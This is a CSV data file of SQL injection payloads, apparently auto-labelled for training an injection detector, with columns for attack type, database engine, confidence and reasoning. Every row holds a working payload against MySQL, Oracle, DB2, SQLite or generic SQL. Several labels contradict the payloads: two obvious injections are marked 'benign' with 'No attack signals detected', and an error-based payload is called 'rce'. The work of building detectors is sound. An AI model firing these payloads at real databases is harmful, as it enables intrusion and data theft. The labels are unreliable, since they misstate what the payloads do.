row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2940,-3496' ) ) or 9323 = 9323#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2941,1%' ) ) ) and 3916 = 6327--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2942,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""exgr"" like ""exgr",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
2943,"-1376%"" ) ) ) or 3458 = 9503 and ( ( ( ""%"" = """,1,,boolean_blind,generic,0.95,3458 = 9503 and detected — boolean_blind injection (priority 8) on generic,rule-based
2944,"1%"" and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
2945,"1' ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'wzdo' = 'wzdo",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
2946,1' ) ) as vdhw where 8858 = 8858 order by 1#,1,,boolean_blind,generic,0.95,8858 = 8858 or detected — boolean_blind injection (priority 8) on generic,rule-based
2947,1 ) where 8232 = 8232 and ( 3020 = 3020 ) *6703--,1,,boolean_blind,generic,0.95,8232 = 8232 and detected — boolean_blind injection (priority 8) on generic,rule-based
2948,"1"" ) where 6018 = 6018 and 7533 = 7533--",1,,boolean_blind,generic,0.95,6018 = 6018 and detected — boolean_blind injection (priority 8) on generic,rule-based
2949,"1 ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 9112 = 9112",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
